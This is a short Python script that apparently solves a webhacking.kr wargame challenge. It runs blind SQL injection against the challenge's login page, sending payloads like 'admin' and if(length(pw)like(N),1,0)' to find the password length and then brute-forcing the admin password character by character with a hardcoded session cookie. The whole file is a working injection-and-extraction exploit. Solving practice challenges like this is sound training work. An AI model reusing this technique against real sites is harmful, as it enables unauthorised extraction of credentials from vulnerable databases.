import requests 

headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) \AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117'}
cookies = {'PHPSESSID':'1plfje78cfg4142vhfrt3l4lon'}

def HttpRequest():
    str_len = 0
    password = ""
    
    for i in range(50):
        url = "https://webhacking.kr/challenge/bonus-1/index.php?id=admin\' and if(length(pw)like({}),1,0) or \'1'=\'0&pw=1".format(i)
        res = requests.get(url, headers=headers, cookies=cookies)

        if res.text.find('wrong password') > 0: 
            str_len = i
    
    for i in range(1, str_len + 1):
        for j in range(48,128):
            url = "https://webhacking.kr/challenge/bonus-1/index.php?id=admin\' and if(ord(substr(pw,{},1))like({}),1,0) or \'1\'=\'0&pw=1".format(i,j)
            res = requests.get(url, headers=headers, cookies=cookies) 
            if res.text.find('wrong password') > 0:
                password += chr(j)
                break
    
    print("Password Length: {}".format(str_len))
    print("Password: {}".format(password))

if __name__ == '__main__':
    HttpRequest() 